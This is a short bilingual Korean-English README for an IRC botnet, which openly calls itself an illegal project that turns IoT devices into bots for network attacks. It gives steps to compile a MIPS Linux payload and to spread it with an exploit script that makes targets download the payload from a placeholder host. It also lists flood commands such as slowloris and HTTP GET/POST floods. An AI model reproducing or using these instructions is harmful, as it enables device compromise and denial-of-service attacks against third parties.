해당 IRC 봇넷은 iOT 봇을 매개체로 사용하여 네트워크 공격을 가하는 불법적인 프로젝트 입니다.

-페이로드 빌드
1. main.go 아이피 변경
2. set GOOS=linux
3. set GOARCH=mipsle
4. go build .

-봇 로드
1. cd sploit
2. iot.go 'http://ex.com/payload.mipsle' 위에 빌드된 페이로드 파일 다운로드 링크로 교체
3. type list.txt | go run iot.go auto

mIRC와 같은 IRC 클라이언트로 기본(#test) 채널에 접속 하시고 사용하시면 됩니다.

-공격 명령어
.get 사이트링크 쓰레드 간격
.post 사이트링크 쓰레드 간격
.cfb 사이트링크 쓰레드 간격
.slowloris 사이트링크 쓰레드 간격
.geye 사이트링크 쓰레드 간격
.stop
.kill 


<---- English ---->

This IRC botnet is an illegal project that uses iOT bots as a medium to attack the network.

--> Build payload:
1. Change main.go IP (change IP to VPS IP)
2. Environment variable: set GOOS=linux 
3. Environment variable: set GOARCH=mipsle 
4. On Command Line: $ go build 

--> Load the bot: 
1. On Command Line: $ cd sploit
2. Replace iot.go 'http://ex.com/payload.mipsle' with the payload file download link built on top.
3. type: $ list.txt | go run iot.go auto

You can use it by connecting to the default (#test) channel with an IRC client such as mIRC.

--> Attack command: (command are executed by using prefix '.')
.get -> sitelink thread interval
.post -> sitelink thread interval
.cfb -> sitelink thread interval
.slowloris -> sitelink thread interval
.geye -> sitelink thread spacing
.stop
.kill